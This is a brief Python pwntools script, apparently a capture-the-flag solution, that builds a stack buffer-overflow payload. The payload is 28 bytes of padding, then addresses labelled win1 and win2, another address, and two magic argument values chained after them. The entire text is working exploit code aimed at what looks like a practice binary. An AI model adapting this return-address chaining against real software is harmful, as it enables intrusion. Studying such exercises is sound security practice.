from pwn import *

payload = ""
payload += "A"*28
payload += p32(0x80485cb) #win1
payload += p32(0x80485d8) #win2
payload += p32(0x804862b)
payload += p32(0xBAAAAAAD)
payload += p32(0xDEADBAAD)

print payload 

